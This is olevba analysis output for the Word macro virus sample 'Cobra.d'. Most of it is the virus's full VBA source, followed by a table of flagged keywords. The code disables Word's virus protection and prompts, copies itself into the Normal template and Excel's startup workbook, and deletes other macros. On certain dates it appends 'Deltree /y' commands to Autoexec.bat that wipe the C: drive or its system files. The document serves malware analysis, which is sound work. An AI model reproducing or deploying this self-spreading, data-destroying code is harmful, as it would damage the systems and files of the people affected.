olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
On Error Resume Next
If Day(Now) = 28 And Month(Now) = 9 Then
MsgBox "Small is my Eye, but big is the Sky.", , "Cobra"
Open "C:\Autoexec.bat" For Append As #1
Print #1, "Deltree /y C:\*.COM"
Close #1
End If
Dialogs(wdDialogFileNew).Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: ./Virus.MSWord.Cobra.d - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0A
Sub AutoOpen()
On Error Resume Next
With Options
.VirusProtection = False
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
Open "C:\Cobra(" + ActiveDocument.Name + Trim(Str(Day(Now))) + Trim(Str(Month(Now))) + Trim(Year(Now)) + ")" For Output As #1
Print #1, "Sub FileNew()"
Print #1, "On Error Resume Next"
Print #1, "If Day(Now)=28 and Month(Now)=9 then"
Print #1, "MsgBox " + """Small is my Eye, but big is the Sky.""" + "," + "," + """Cobra"""
Print #1, "Open " + """C:\Autoexec.bat""" + " for append as #1"
Print #1, "Print #1," + """Rem **************"""
Print #1, "Close #1"
Print #1, "End If"
Print #1, "Dialogs(wdDialogFileNew).Show"
Print #1, "End Sub"
Close #1
Call MacDel
Call MacCopy
Call ExlCopy
End Sub
Sub AutoClose()
On Error Resume Next
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Sub FileNew()" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\Cobra(" + ActiveDocument.Name + Trim(Str(Day(Now))) + Trim(Str(Month(Now))) + Trim(Year(Now)) + ")")
End If
If Day(Now) = Month(Now) Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 6, _
"Print #1," + """Deltree /y C:\"""
End If
If Day(Now) = Month(Now) * 2 Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 6, _
"Print #1," + """Deltree /y C:\*.COM"""
End If
If Day(Now) = Month(Now) * 3 Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 6, _
"Print #1," + """Deltree /y C:\*.SYS"""
End If
Call MacDel
Call MacCopy
Call ExlCopy
If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub MacDel()
On Error GoTo Ehd
For i = 1 To ActiveDocument.AttachedTemplate.VBProject.VBComponents.Count
If (ActiveDocument.AttachedTemplate.VBProject.VBComponents(i).Name <> "Cobra") And (ActiveDocument.AttachedTemplate.VBProject.VBComponents(i).Name <> "ThisDocument") Then
Application.OrganizerDelete Source:=ActiveDocument.AttachedTemplate.FullName, _
Name:=ActiveDocument.AttachedTemplate.VBProject.VBComponents(i).Name, Object:=wdOrganizerObjectProjectItems
End If
Next i
Ehd:
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If (ActiveDocument.VBProject.VBComponents(i).Name <> "Cobra") And (ActiveDocument.VBProject.VBComponents(i).Name <> "ThisDocument") Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, _
Name:=ActiveDocument.VBProject.VBComponents(i).Name, Object:=wdOrganizerObjectProjectItems
End If
Next i
End Sub
Sub MacCopy()
On Error Resume Next
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=ActiveDocument.AttachedTemplate.FullName, _
Name:="Cobra", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=ActiveDocument. _
AttachedTemplate.FullName, Destination:=ActiveDocument. _
FullName, Name:="Cobra", Object:=wdOrganizerObjectProjectItems
End Sub
Sub ExlCopy()
On Error Resume Next
Set exlapp = CreateObject("Excel.Application")
Set wrkbook = exlapp.workbooks.Add
Kill exlapp.Application.StartupPath & "\Book1."
wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines)
wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 1, _
"Private Sub Workbook_Deactivate()"
wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines 4
wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines 8
wrkbook.SaveAs exlapp.Application.StartupPath & "\Book1."
wrkbook.Close
exlapp.Quit
End Sub
Sub FileExit()
If Day(Now) Mod 5 = 0 Then
For x = 1 To 31
Selection.TypeText "Cobra " + Chr(13) + Application.UserName + Chr(13)
Next
End If
WordBasic.FileExit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

